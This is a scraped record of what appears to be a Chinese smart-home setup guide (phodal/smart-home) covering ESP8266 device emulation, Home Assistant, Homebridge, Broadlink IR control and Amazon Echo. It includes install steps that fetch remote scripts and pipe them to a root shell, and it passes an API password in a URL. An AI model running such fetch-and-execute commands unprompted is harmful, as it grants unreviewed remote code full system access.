Esp8266 Alexa Wemo switch emulator\uff1ahttps://github.com/witnessmenow/esp8266-alexa-wemo-emulator\nESP8266 \u4eff\u771f Philips Hue\nESP8266 Hue Emulator \u9879\u76ee\u5730\u5740\uff1aESP8266HueEmulator\n\u8fd9\u4e2a Demo \u9700\u8981\u8fd9\u4e48\u51e0\u4e2a\u5e93NeoPixelBus\u3001aJson\u3001Time\u3001NtpClient\uff0c\u540c\u65f6\u8fd8\u9700\u8981\u4fee\u6539\u4e00\u4e9b\u76f8\u5173\u7684\u914d\u7f6e\u3002\n\u56e0\u6b64\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e2a\u811a\u672c\u5b89\u88c5\uff0c\u6bd4\u8f83\u7b80\u5355\uff1a\n\u6ce8\u610f\uff1a\u5982\u679c\u662f Mac OS\uff0c\u9700\u8981\u5c06\u4e0b\u9762\u811a\u672c\u4e2d\u7684 $HOME/Arduino/libraries/ \u6539\u4e3a $HOME/Documents/Arduino/libraries/\nmkdir -p $HOME/Arduino/libraries/\ncd $HOME/Arduino/libraries/\ngit clone --branch 2.1.4 https://github.com/Makuna/NeoPixelBus.git\ngit clone https://github.com/interactive-matter/aJson.git\ngit clone https://github.com/PaulStoffregen/Time.git\ngit clone https://github.com/gmag11/NtpClient.git\nsed -i -e 's|#define PRINT_BUFFER_LEN 256|#define PRINT_BUFFER_LEN 4096|g' aJson/aJSON.h\ncd -\ngit clone https://github.com/probonopd/ESP8266HueEmulator.git\nsed -i -e 's|#include \"/secrets.h\"|//#include \"/secrets.h\"|g' ESP8266HueEmulator/ESP8266HueEmulator/ESP8266HueEmulator.ino\nsed -i -e 's|//const char|const char|g' ESP8266HueEmulator/ESP8266HueEmulator/ESP8266HueEmulator.ino\n\u518d\u5c06\u4ee3\u7801\u70e7\u5f55\u5230 ESP8266 \u4e0a\uff0c\u5c31\u53ef\u4ee5\u5728 Homekit \u770b\u5230\u76f8\u5e94\u7684\u914d\u7f6e\u3002\n\u5c0f\u7c73\u667a\u80fd\u63d2\u5ea7\n\u5bfb\u627e\u8bbe\u5907\nnpm install -g miio\nmiio --discover\nnpm install --save miio\n\u96c6\u6210\u7f51\u5173\u7bc7\nRaspberry Pi Home Assistant\nImages: https://home-assistant.io/docs/hassbian/installation/\nImages Downloader: https://etcher.io/\n\u53d1\u73b0\u6587\u6863\u597d\u50cf\u6709\u70b9\u95ee\u9898\uff0c\u4fbf\u624b\u52a8\u5730\u5c1d\u8bd5\u5b89\u88c5\uff1a\npip3 install --upgrade homeassistant\n\u8fd0\u884c\nsudo -u homeassistant -H /srv/homeassistant/bin/hass\n\u5e76\u4e0d\u6ca1\u5de5\u4f5c\uff0c\u4e8e\u662f\u6267\u884c\u5b98\u65b9\u7684\u5b89\u88c5\u811a\u672c\uff1a\ncurl -O https://raw.githubusercontent.com/home-assistant/fabric-home-assistant/master/hass_rpi_installer.sh && sudo chown pi:pi hass_rpi_installer.sh && bash hass_rpi_installer.sh\n\u53c8\u5728\u6211\u7684 MBP \u4e0a\u5b89\u88c5\u5c1d\u8bd5\npip3 install homeassistant\nhass --open-ui\n\u7136\u540e\u53d1\u73b0\u5b89\u88c5\u5b8c\u5c31\u53ef\u4ee5\u4e86\u3002\nHome Assistant Broadlink PM PRO\n\u5728 configuration.yaml \u6587\u4ef6\u4e2d\u6dfb\u52a0\u4e0b\u9762\u7684\u914d\u7f6e\uff1a\n# Example configuration.yaml entry\nswitch:\n- platform: broadlink\nhost: IP_ADDRESS\nmac: 'MAC_ADDRESS'\nswitches:\nreciever:\ncommand_on: 'switch_packet on'\ncommand_off: 'switch_packet off'\n\u83b7\u53d6 Broadlink \u914d\u7f6e\n\u4ece https://github.com/NightRang3r/Broadlink-e-control-db-dump \u83b7\u53d6\u6570\u636e\u5bfc\u51fa\u811a\u672c\n\u6253\u5f00 \u6613\u63a7\uff08\u82f1\u8bed\uff1aE-Control\uff09 \u5e94\u7528\uff0c\u70b9\u51fb\u83dc\u5355 -> \u5171\u4eab -> \u4e91\u5206\u4eab \u5c31\u4f1a\u751f\u6210\u76f8\u5e94\u7684\u914d\u7f6e\u6587\u4ef6\n\u6d4f\u89c8\u624b\u673a\u4e0a\u7684 /broadlink/newremote/SharedData/ \u76ee\u5f55\uff0c\u590d\u5236\u51fa jsonSubIr\u3001jsonButton\u3001jsonIrCode \u4e09\u4e2a\u6587\u4ef6\n\u5b89\u88c5\u597d python \u73af\u5883\uff0c \u5e76\u5b89\u88c5 pip install simplejson\n\u6267\u884c\u7b2c\u4e00\u6b65\u4ee3\u7801\u4e2d\u7684\u811a\u672c\uff0cpython getBroadlinkSharedData.py\n\u5b89\u88c5python-broadlink\uff0c\u5730\u5740 https://github.com/mjg59/python-broadlink.git\n\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u6211\u7684\u7a7a\u8c03\u95ee\u9898\uff0c\u83b7\u53d6\u5230\u7684\u914d\u7f6e\u662f\u7a7a\u7684\u3002\nHomebridge\n\u76f8\u5173\u7684\u63d2\u4ef6\uff1a\nYeelight\uff1ahomebridge-yeelight\n\u5c0f\u7c73\u8bbe\u5907\uff1ahomebridge-aqara\nBroadlink RM \u7ea2\u5916\uff1ahomebridge-broadlink-rm\nBroadlink SP \u5f00\u5173: homebridge-broadlink-sp\nHome Assistant: homebridge-homeassistant\n\u5b89\u88c5 Homebridge\n\u7f16\u8f91\u8f6f\u4ef6\u6e90\nsudo vim /etc/apt/sources.list\n\u4fee\u6539\u4e3a\u963f\u91cc\u4e91\uff0c\u901f\u5ea6\u4f1a\u66f4\u5feb\u4e00\u4e9b\uff1a\ndeb http://mirrors.aliyun.com/raspbian/raspbian/ jessie main non-free contrib\ndeb-src http://mirrors.aliyun.com/raspbian/raspbian/ jessie main non-free contrib\n\u5b89\u88c5 Node.js ARM \u7248 \uff1a\ncurl -sL https://deb.nodesource.com/setup_7.x | sudo -E bash -\nsudo apt-get install -y nodejs\n\u5b89\u88c5 avahi\nsudo apt-get install libavahi-compat-libdnssd-dev\n\u5b89\u88c5 homebridge\nnpm install -g homebridge\n\u5b89\u88c5\u76f8\u5e94\u7684\u63d2\u4ef6\nsudo npm install -g homebridge-yeelight\nsudo npm install -g homebridge-homeassistant\nsudo npm install -g homebridge-broadlink-sp\nsudo npm install -g homebridge-broadlink-rm\nsudo npm install -g homebridge-platform-wemo\nsudo npm install -g homebridge-miio\n\u5bf9\u5e94\u7684\u914d\u7f6e\u5728 home-assistant \u76ee\u5f55\u4e0b\u7684 configuration.yaml \u6587\u4ef6\u3002\n\u5f00\u673a\u542f\u52a8\n\u5728 /etc/default \u76ee\u5f55\u4e0b\u521b\u5efa homebridge \u6587\u4ef6\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a\n#Defaults / Configuration options for homebridge\n#The following settings tells homebridge where to find the config.json file and where to persist the data (i.e. pairing and others)\nHOMEBRIDGE_OPTS=-U /var/lib/homebridge\n# If you uncomment the following line, homebridge will log more\n# You can display this via systemd's journalctl: journalctl -f -u homebridge\n# DEBUG=*\n\u5728 /etc/systemd/system \u76ee\u5f55\u4e0b\u521b\u5efa homebridge.service \u6587\u4ef6\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a\n[Unit]\nDescription=Node.js HomeKit Server\nAfter=syslog.target network-online.target\n[Service]\nType=simple\nUser=homebridge\nEnvironmentFile=/etc/default/homebridge\n# Adapt this to your specific setup (could be /usr/bin/homebridge)\n# See comments below for more information\nExecStart=/usr/local/bin/homebridge $HOMEBRIDGE_OPTS\nRestart=on-failure\nRestartSec=10\nKillMode=process\n[Install]\nWantedBy=multi-user.target\n\u542f\u52a8\u670d\u52a1\nsystemctl daemon-reload\nsystemctl enable homebridge\nsystemctl start homebridge\nHomeBridge \u96c6\u6210 Home Assistant\n\u5b89\u88c5\u63d2\u4ef6\uff1a\nnpm install -g homebridge-homeassistant\n\u6dfb\u52a0\u914d\u7f6e\uff1a\n\"platforms\": [\n{\n\"platform\": \"HomeAssistant\",\n\"name\": \"HomeAssistant\",\n\"host\": \"http://127.0.0.1:8123\",\n\"password\": \"yourapipassword\",\n\"supported_types\": [\"binary_sensor\", \"climate\", \"cover\", \"device_tracker\", \"fan\", \"group\", \"input_boolean\", \"light\", \"lock\", \"media_player\", \"scene\", \"sensor\", \"switch\"],\n\"logging\": true\n}\n]\nAmazon Echo \u8bbe\u7f6e\n\u6211\u7528\u7684\u662f Amazon Echo Dot 2 \u5c31\u662f\u90a3\u4e2a Mini \u7248\u7684\n\u5b89\u88c5 Yeelight Skill\n\u5b89\u88c5 Mijia\n\u4e24\u8005\u9700\u8981\u767b\u5f55\u5c0f\u7c73\u7684\u8d26\u53f7\uff0c\u624d\u80fd\u6388\u6743\u83b7\u5f97\u63a7\u5236\u3002\n\u7ed3\u5408 HomeAssistant \u548c Amazon Echo\n\u6587\u6863\uff1ahttps://home-assistant.io/components/alexa/\n\u5982\u679c\u53ea\u662f\u4e3a\u4e86\u6253\u5f00\u3001\u5173\u95ed\u8bbe\u5907\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 emulated_hue \u7ec4\u4ef6\uff0c\u5b83\u53ef\u4ee5\u63d0\u4f9b\u4e00\u4e2a\u865a\u62df\u7684 Philips Hue \u6865\u3002\n\u53ea\u5f00\u5173\u8bbe\u5907\n\u4f7f\u7528 Home Assistant \u7684 Emulated Hue \u7ec4\u4ef6\u5c31\u53ef\u4ee5\u4e86\uff0c\u6dfb\u52a0\u5982\u4e0b\u7684\u914d\u7f6e\uff1a\nemulated_hue:\nhost_ip: 192.168.199.242\n\u5176\u4e2d\u7684 192.168.199.242 \u5373\u662f Home Assistant \u7684\u670d\u52a1\u5668\u5730\u5740\n\u66f4\u8be6\u7ec6\u7684\u914d\u7f6e\uff0c\u5982\uff1ahttps://github.com/Teagan42/HomeAssistantConfig\n\u5b9a\u5236\u547d\u4ee4\n\u4e3a\u4e86\u4f7f\u7528\u66f4\u591a\u7684\u529f\u80fd\uff0c\u5219\u9700\u8981\u4f7f\u7528\u5c06 Home Assistant \u66b4\u9732\u5230\u516c\u7f51\u4e0a\u2014\u2014\u4f7f\u7528\u8bf8\u5982\u82b1\u751f\u58f3\u7b49\u3002\uff08PS:\u7531\u4e8e\u5f53\u524d\u5bb6\u91cc\u4f7f\u7528\u7684\u662f\u5149\u7ea4\uff0c\u9700\u8981\u5149\u7ea4\u732b\uff0c\u5b9e\u65bd\u4e0a\u6bd4\u8f83\u56f0\u96be\uff1b\u56e0\u6b64\uff0c\u5916\u90e8\u8bbf\u95ee\u9700\u8981\u4f7f\u7528\u4e00\u7ea7\u8dcc\u5e45\uff0c\u6682\u65f6\u6ca1\u6709\u8fdb\u884c\u8fd9\u65b9\u9762\u7684\u5c1d\u8bd5\uff09\u3002\n\u968f\u540e\u5728 Amazon developer console\n\u521b\u5efa\u76f8\u5e94\u7684 Alexa Skill\uff0c\u5e76\u6dfb\u52a0 Endpoing\uff1ahttps://YOUR_HOST/api/alexa?api_password=YOUR_API_PASSWORD\n\u5fc5\u987b\u4f7f\u7528 HTTPS\n\u5b9a\u5236 Home Assistant\nHome Assistant RESTful API \u5730\u5740\uff1aHome Assistant API\n\u7ed3\u5408 ESP8266 + Broadlink + Amazon Echo\n\u5728\u4e0a\u9762\u6211\u4eec\u8bf4\u5230\uff0cESP8266 \u53ef\u4ee5\u6a21\u62df\u6210 Wemo \u8bbe\u5907\uff0c\u800c Wemo \u53ef\u4ee5\u76f4\u63a5\u7531 Amazon Echo \u8bc6\u522b\u3002\u4f46\u662f Broadlink \u76f4\u63a5\u4e0e Amazon Echo \u914d\u5408\uff0c\u4e0d\u53ef\u907f\u514d\u5730\u51fa\u73b0\u4e86\u4e00\u4e9b\u95ee\u9898\u3002\u5728\u770b\u5230\u4e86python-broadlink \u5e93\uff0c\u4fbf\u60f3\u7740\u662f\u4e0d\u662f\u76f4\u63a5\u62ff flask \u7ed3\u5408\u4e00\u4e0b broadlink \u5c31\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e2a\u7b80\u5355\u7684 HTTP \u670d\u52a1\u3002\u968f\u540e\uff0cESP8266 \u53ea\u9700\u8981\u51e0\u4e2a\u8bf7\u6c42\u5427\uff0c\u5c31\u80fd\u76f4\u63a5\u5bf9\u5bb6\u7535\u8fdb\u884c\u63a7\u5236\u3002\nBroadlink HTTP Server\n\u4e3a\u4e86\u907f\u514d\u81ea\u5df1\u9020\u5e95\u5c42\u7684\u8f6e\u5b50\uff0c\u60f3\u5728 GitHub \u4e0a\u5bfb\u89c5\u4e86\u4e00\u756a\uff0c\u627e\u5230 broadlink-http-rest \u9879\u76ee\uff0c\u4fee\u6539\u6210\u9002\u5408\u81ea\u5df1\u9700\u6c42\u7684\u4ee3\u7801\uff0c\u653e\u5728\u4e86 GitHub \u4e0a\uff1ahttps://github.com/phodal/broadlink-http-rest\n\u5b9e\u9645\u4e0a\uff0c\u6211\u4eec\u6240\u9700\u8981\u505a\u7684\u5c31\u662f\uff0c\u4fee\u6539\u81ea\u5df1\u7684 settings.py \u6587\u4ef6\u3002\u5e76\u4e14\u8fd9\u90e8\u5206\u7684\u5185\u5bb9\u53ef\u4ee5\u76f4\u63a5\u7531 API \u6765\u751f\u6210\u3002\u642d\u5efa\u4e4b\u524d\uff0c\u5148\u4e0b\u8f7d\u4e0a\u9762\u7684\u4ee3\u7801\uff1a\ngit clone https://github.com/phodal/broadlink-http-rest\n\u7136\u540e\u5b89\u88c5\u4f9d\u8d56\uff1a\npip install -r requirements.txt\n\u518d\u8fd0\u884c\u8d77\u670d\u52a1: python server.py\n\u7136\u540e\u8bbf\u95ee\uff1ahttp://localhost:8080/learnCommand/tvon\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u5b66\u4e60\u7ea2\u5916\u6307\u4ee4\u3002\n\u63a5\u7740\u901a\u8fc7\u8bbf\u95ee\uff1ahttp://localhost:8080/sendCommand/tvon\uff0c\u5c31\u53ef\u4ee5\u53d1\u9001\u76f8\u5e94\u7684\u7ea2\u5916\u7f16\u7801\u3002\n\u540c\u65f6\uff0c\u5b83\u4f1a\u5728 settings.py \u4e0b\u751f\u6210\u76f8\u5e94\u7684 tvon \u547d\u4ee4\u53ca\u7f16\u7801\uff0c\u5982\u4e0b\uff1a\n[Commands]\ntvon = 9bff369b8c9f94d6a2ec86e2b83749670662283a956794365cfb8ecf42d42cc41256a408c128a0bcbe56e6050b561e1436c998299ff9adc8a17d8350d55341e83eca9d5bb905472e5a23bc035f94dab944af2de6513b09502c17b385fca66090\n\u540c\u6837\u7684\uff0c\u5bf9\u4e8e\u5173\u95ed\u8bbe\u5907\u6765\u8bf4\uff0c\u6211\u4eec\u5c31\u9700\u8981\u4f7f\u7528 tvoff\u3002\n\u4ee5\u6b64\u7c7b\u63a8\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f55\u5165\u6240\u6709\u7684\u8bbe\u5907\u3002\n\u4f7f\u7528 ESP8266 \u63a7\u5236 Broadlink\n\u6253\u5f00 smart-home/emulator/esp8266-wemos/esp8266-wemos.ino \u6587\u4ef6\uff0c\u5199\u4e2a\u8d1f\u8d23\u53d1\u8bf7\u6c42\u7684\u65b9\u6cd5\uff1a\nvoid httpServer(String command) {\nHTTPClient http;\nSerial.print(\"[HTTP] begin...\\n\");\n// configure traged server and url\n//http.begin(\"https://192.168.1.12/test.html\", \"7a 9c f4 db 40 d3 62 5a 6e 21 bc 5c cc 66 c8 3e a1 45 59 38\"); //HTTPS\nhttp.begin(\"http://192.168.199.170:8080/sendCommand/\" + command); //HTTP\nSerial.print(\"[HTTP] GET...\\n\");\n// start connection and send HTTP header\nint httpCode = http.GET();\n// httpCode will be negative on error\nif(httpCode > 0) {\n// HTTP header has been send and Server response header has been handled\nSerial.printf(\"[HTTP] GET... code: %d\\n\", httpCode);\n// file found at server\nif(httpCode == HTTP_CODE_OK) {\nString payload = http.getString();\nSerial.println(payload);\n}\n} else {\nSerial.printf(\"[HTTP] GET... failed, error: %s\\n\", http.errorToString(httpCode).c_str());\n}\n}\n\u5bf9\u5e94\u7684\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5199\u76f8\u5e94\u7684\u63a7\u5236\u903b\u8f91\uff1a\nvoid tvOn() {\nhttpServer(\"tvon\");\n}\nvoid tvOff() {\nhttpServer(\"tvoff\");\n}\nvoid boxOn() {\nhttpServer(\"mion\");\n}\nvoid boxOff() {\nhttpServer(\"mioff\");\n}\nvoid airOn() {\nhttpServer(\"airon\");\n}\nvoid airOff() {\nhttpServer(\"airoff\");\n}\n\u4fbf\u53ef\u4ee5\u4f7f\u7528 ESP8266 \u63a7\u5236 Broadlink\u3002\n\u6700\u540e\uff0c\u4fbf\u662f\u70e7\u5f55\u7a0b\u5e8f\uff0c\u7136\u540e\u76f4\u63a5\u4f7f\u7528 Amazon Echo \u63a7\u5236\u3002\nRaspberry Pi Cornata\n\u5b98\u65b9\u6587\u6863\uff1aUse Cortana Function on IoT Core\n\u4e0b\u8f7d Windows 10 IoT Core Dashboard\n\u4e0b\u8f7d\u5730\u5740\uff1ahttps://developer.microsoft.com/en-us/windows/iot/docs/iotdashboard\n\u5b89\u88c5\u6700\u65b0\u955c\u50cf\n\u6253\u5f00 Windows 10 IoT Core Dashboard\uff0c\u4e3a RPi \u70e7\u5f55\u955c\u50cf\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a\n\u5b98\u65b9\u5efa\u8bae\u8981\u66f4\u65b0\u5230\u6700\u65b0\u3002\u4f7f\u7528 Web \u754c\u9762\u6253\u5f00\u8bbe\u5907\u7684 Windows Update\uff0chttp://:8080/#Windows%20Update\uff0c\u5982http://192.168.199.223:8080/#Windows%20Update\u3002\n\u7136\u540e\u5230 Devices \u4e2d\u770b\u662f\u5426\u51fa\u73b0\u76f8\u5e94\u7684 Microphone \u8bbe\u7f6e\u3002\u3002\n\u5f00\u673a\u542f\u52a8 Cortana\n\u5728\u9996\u9875\u7684 Device Settigns \u6700\u4e0b\u9762\u6709\u4e00\u4e2a Start Cortana on Boot \u7684\u9009\u9879\u3002\n\u4f7f\u7528 Windows IoT Remote Server \u8bbf\u95ee\uff1a\u5728 http://192.168.199.223:8080/#Remote \u5728\u52fe\u4e0a Enable Windows IoT Remote Server\n\u8bbe\u7f6e speechlanguage \u6210\u4e2d\u6587\uff1a\n\u6253\u5f00 Processes -> Run command\uff0c\u6267\u884c\uff1a\nIoTSettings -set region CN\nIoTSettings -set speechlanguage zh-Hans-CN\n\u5b66\u4e60\u7528\u6237\u4e60\u60ef\nTBD\n\u5de5\u5177\u96c6\nTools:\nAlexa Skill Testing Tool\nRaspberry Pi Burn images Tools\nLICENSE\n\u00a9 2017 A Phodal Huang's Idea. This code is distributed under the MIT license. See LICENSE in this directory.\n\u5f85\u6211\u4ee3\u7801\u7f16\u6210\uff0c\u5a36\u4f60\u4e3a\u59bb\u53ef\u597d\nFootnotes\nhttps://en.wikipedia.org/wiki/Home_automation \u21a9", "link": "https://github.com/phodal/smart-home", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "phodal's smart home guide\n\u8fd9\u662f\u4e00\u4e2a\u63a2\u7d22\u6027\u9879\u76ee\uff0c\u65e8\u5728\u63d0\u4f9b\u4e00\u4e2a\u5b8c\u6574\u7684\u667a\u80fd\u5bb6\u5c45\u642d\u5efa\u6307\u5357\u3002\n\u89c6\u9891\u6f14\u793a\u5730\u5740\uff1a\u817e\u8baf\u89c6\u9891\n\u67b6\u6784\u56fe\uff1a\n\u67b6\u6784\u7b80\u4ecb\n\u4f7f\u7528 home assistant\u3001homebridge \u4f5c\u4e3a\u667a\u80fd\u5bb6\u5c45\u7684\u6838\u5fc3\n\u4f7f\u7528 amazon echo \u4f5c\u4e3a\u8bed\u97f3\u8f93\u5165\u5de5\u5177\uff08\u5f53\u524d\u4ec5\u652f\u6301\u82f1\u8bed\uff09\n\u4f7f\u7528 iphone \u7684\u201c\u5bb6\u5ead\u201d\u5e94\u7528\u4f5c\u4e3a\u63a7\u5236\u5de5\u5177\n\u53ef\u4ee5\u4f7f\u7528\u4efb\u4f55\u7684\u8bbe\u5907\u8fde\u63a5 home assistant \u670d\u52a1\u6765\u63a7\u5236\u5e94\u7528\n\u76ee\u5f55\n\u57fa\u7840\u77e5\u8bc6\u7bc7\n\u667a\u80fd\u5bb6\u5c45\u7b80\u4ecb\n\u667a\u80fd\u97f3\u7bb1\namazon echo\n\u4e2d\u5fc3\u7f51\u5173\nhome assistant\nhomebridge\n\u8bbe\u5907\n\u901a\u8baf\u673a\u5236\u4e0e\u534f\u8bae\n\u65e7\u8bbe\u5907\u4e2d\u67a2\n\u4eff\u771f\u8bbe\u5907\n\u5b9e\u6218\u8bbe\u5907\u7bc7\nesp8266 \u4eff\u771f\u8bbe\u5907\nesp8266 \u4eff\u771f wemo\nesp8266 \u4eff\u771f philips hue\n\u5c0f\u7c73\u667a\u80fd\u63d2\u5ea7\n\u96c6\u6210\u7f51\u5173\u7bc7\nraspberry pi home assistant\nhome assistant broadlink pm pro\n\u83b7\u53d6 broadlink \u914d\u7f6e\nhomebridge\n\u5b89\u88c5 homebridge\n\u5f00\u673a\u542f\u52a8\nhomebridge \u96c6\u6210 home assistant\namazon echo \u8bbe\u7f6e\n\u7ed3\u5408 homeassistant \u548c amazon echo\n\u53ea\u5f00\u5173\u8bbe\u5907\n\u5b9a\u5236\u547d\u4ee4\n\u5b9a\u5236 home assistant\nraspberry pi cornata\n\u5b66\u4e60\u7528\u6237\u4e60\u60ef\n\u5de5\u5177\u96c6\n\u57fa\u7840\u77e5\u8bc6\u7bc7\n\u667a\u80fd\u5bb6\u5c45\u7b80\u4ecb\n\u5f53\u524d\uff0c\u6211\u4eec\u8c08\u8bba\u667a\u80fd\u5bb6\u5c45\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5b9e\u73b0\u4e0a\u662f\u5728\u8ba8\u8bba\uff1a\u5bb6\u5ead\u81ea\u52a8\u5316\u3002\u5f15\u81ea\u7ef4\u57fa\u767e\u79d1\uff0c\u5bf9\u4e8e\u667a\u80fd\u5bb6\u5c45\u7684\u4ecb\u7ecd1\uff1a\nhome automation or smart home (also known as domotics) is building automation for the home.\n\u968f\u7740\u673a\u5668\u5b66\u4e60\u548c\u6df1\u5ea6\u5b66\u4e60\u7b49 ai \u6280\u672f\u7684\u8fdb\u4e00\u6b65\u666e\u53ca\uff0c\u8fd9\u4e00\u70b9\uff08\u667a\u80fd\u5316\uff09\u5728\u6700\u8fd1\u51e0\u5e74\u91cc\uff0c\u5e94\u8be5\u4f1a\u53d1\u751f\u4e00\u4e9b\u5267\u70c8\u7684\u53d8\u5316\u3002\u800c\u65e0\u8bba\u5982\u4f55\uff0c\u6211\u53ef\u4e0d\u592a\u5e0c\u671b\u6211\u8981\u88ab\u673a\u5668\u50ac\u7740\u8d77\u5e8a\u3002\n\u5f00\u59cb\u5b9e\u6218\u4e4b\u524d\uff0c\u8ba9\u6211\u4eec\u5148\u5173\u6ce8\u4e8e\u5f53\u524d\u667a\u80fd\u5bb6\u5c45\u7684\u51e0\u4e2a\u5173\u952e\u70b9\uff1a\n\u8bbe\u5907\u3002\u8fd9\u4e9b\u8bbe\u5907\u8981\u4e48\u4f7f\u7528 wifi\uff0c\u8981\u4e48\u8981\u4f7f\u7528\u84dd\u7259\uff0c\u65b9\u4fbf\u4f7f\u7528\u624b\u673a\u8fde\u63a5\u4e0a\u8fd9\u4e9b\u8bbe\u5907\u3002\u4f9d\u5f53\u524d\u7684\u60c5\u51b5\u6765\u770b\uff0c\u4e3b\u8981\u662f\u4ee5 wifi \u4e3a\u4e3b\uff0c\u5728\u624b\u673a\u4e0a\u914d\u7f6e\u5b8c\u540e\uff0c\u53ef\u4ee5\u8f7b\u677e\u5730\u5b9e\u73b0\u8fdc\u7a0b\u63a7\u5236\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u4ed6\u4eec\u5728\u4e0e\u624b\u673a\u901a\u8baf\u7684\u65f6\u5019\uff0c\u4f1a\u4f7f\u7528\u4e00\u4e9b\u81ea\u5b9a\u4e49\u7684\u901a\u8baf\u89c4\u5219\uff0c\u5e76\u4e14\u4f3c\u4e4e\u5f88\u5bb9\u6613\u88ab\u7834\u89e3\uff08\u53c2\u89c1\u4eff\u771f\u5668\u4e00\u8282\uff09\u3002\u5982 philips hue \u667a\u80fd\u706f\u3001wemo \u5f00\u5173\u7b49\u7b49\uff0c\u4ed6\u4eec\u90fd\u5df2\u7ecf\u53ef\u4ee5\u88ab\u4eff\u771f\uff0c\u5e76\u4f5c\u4e3a homekit \u7ec4\u4ef6\u4f7f\u7528\u3002\n\u81ea\u52a8\u5316\u3002\u81ea\u52a8\u5316\u662f\u6307\u4f60\u53ef\u4ee5\u5b9a\u65f6\u4e5f\u5f00\u5173\u67d0\u4e2a\u7279\u5b9a\u7684\u8bbe\u5907\uff0c\u95f9\u949f\u4e00\u54cd\uff0c\u4fbf\u6253\u5f00\u706f\u8bf8\u5982\u6b64\u7c7b\u7684\u3002\n\u573a\u666f\uff08\u89c4\u5219\uff09\u3002\u4e0e\u81ea\u52a8\u5316\u7a0d\u5fae\u533a\u522b\u7684\u662f\uff0c\u573a\u666f\u662f\u67d0\u4e2a\u7279\u5b9a\u573a\u5408\u4e0b\uff0c\u5bf9\u4e00\u7cfb\u5217\u8bbe\u5907\u7684\u64cd\u4f5c\uff0c\u5982\u65e9\u8d77\uff0c\u4fbf\u5f00\u706f\u3001\u6253\u5f00\u7a97\u5e18\uff0c\u79bb\u5f00\u5bb6\uff0c\u5219\u9501\u95e8\u3001\u5173\u95ed\u4e00\u7cfb\u5217\u7528\u7535\u5668\u3001\u5f00\u542f\u9632\u76d7\u529f\u80fd\u7b49\u7b49\u3002\n\u4e2d\u5fc3\u7f51\u5173\u3002\u5f53\u6211\u4eec\u6240\u4f7f\u7528\u7684\u4e00\u7cfb\u5217\u8bbe\u5907\u62e5\u6709 wifi \u529f\u80fd\u65f6\uff0c\u88c5\u6709\u5404\u79cd\u8f6f\u4ef6\u7684\u624b\u673a\u4fbf\u76f8\u5f53\u4e8e\u63a7\u5236\u4e2d\u67a2\u3002\u800c\u8fd9\u6837\u7684\u8bbe\u8ba1\u672c\u8eab\u662f\u4e0d\u5408\u7406\u7684\uff0c\u4f60\u8981\u5728\u624b\u673a\u4e0a\u5b89\u88c5\u4e00\u7cfb\u5217\u7684\u5e94\u7528\u3002\u8fd9\u4e2a\u65f6\u5019\uff0c\u4fbf\u9700\u8981\u4e00\u4e2a\u989d\u5916\u7684\u8f6f\u4ef6\u4f5c\u4e3a\u4e2d\u5fc3\uff0c\u6765\u63a5\u5165\u8fd9\u4e9b\u8bbe\u5907\uff0c\u800c\u624b\u673a\u4e0a\u4e5f\u4e0d\u9700\u8981\u591a\u4f59\u7684\u989d\u5916\u8f6f\u4ef6\u3002\u5982 homekit\u3001home assistant \u5c31\u662f\u8fd9\u6837\u7684\u4f8b\u5b50\u3002\n\u800c\u4f5c\u4e3a\u4e00\u4e2a\u666e\u901a\u7684\u7528\u6237\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5173\u6ce8\u4fbf\u5229\u7684\u751f\u6d3b\u3002\u4f5c\u4e3a\u4e00\u4e2a\u6781\u5ba2\uff0c\u6211\u4eec\u5219\u5173\u6ce8\u4e8e\u5982\u4f55\u6539\u9020\u6210\u9700\u8981\u7684\u529f\u80fd\u3002\n\u667a\u80fd\u97f3\u7bb1\n\u5b66\u672f\u4e0a\u6709\u4e2a\u6982\u5ff5\u662f\u201c\u4f20\u58f0\u5668\u9635\u5217\u201d\uff0c\u4e3b\u8981\u7531\u4e00\u5b9a\u6570\u76ee\u7684\u58f0\u5b66\u4f20\u611f\u5668\u7ec4\u6210\uff0c\u7528\u6765\u5bf9\u58f0\u573a\u7684\u7a7a\u95f4\u7279\u6027\u8fdb\u884c\u91c7\u6837\u5e76\u5904\u7406\u7684\u7cfb\u7edf\u3002\n\u5982\u4e0b\u56fe\u6240\u793a amazon echo \u7684\u7535\u8def\u677f\uff1a\n\u5176\u53ca\u5bf9\u5e94\u7684\u9ea6\u514b\u98ce\u7684\u4f4d\u7f6e\uff1a\n\u5176\u6240\u8981\u4e3b\u8981\u89e3\u51b3\u8fdc\u8ddd\u79bb\u8bed\u97f3\u8bc6\u522b\u7684\u95ee\u9898\uff0c\u4ee5\u4fdd\u8bc1\u771f\u5b9e\u573a\u666f\u4e0b\u7684\u8bed\u97f3\u8bc6\u522b\u7387\u3002\u800c\u8fd9\u4e9b\u8bbe\u5907\u7684\u4e3b\u8981\u539f\u7406\uff0c\u90fd\u662f\u5c06\u8bed\u97f3\u4fe1\u53f7\u53d1\u9001\u5230\u670d\u52a1\u5668\u7aef\uff0c\u7531\u670d\u52a1\u5668\u7aef\u8bc6\u522b\uff0c\u5e76\u5339\u914d\u5230\u5bf9\u5e94\u7684\u6307\u4ee4\u4e0a\u3002\namazon echo\n\u5b9e\u9a8c\u8868\u660e aws \u7684\u670d\u52a1\u5e76\u4e0d\u662f\u90a3\u4e48\u53ef\u9760\u7684~~\uff0c\u7ecf\u5e38\u51fa\u73b0\uff1ayour echo dot is not connected\n\u81ea\u5b9a\u4e49\u7ec4\u4ef6\u7684\u539f\u7406\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a\n\u4e2d\u5fc3\u7f51\u5173\nhome assistant\nhome assistant \u662f\u4e00\u4e2a\u8fd0\u884c\u5728 python 3 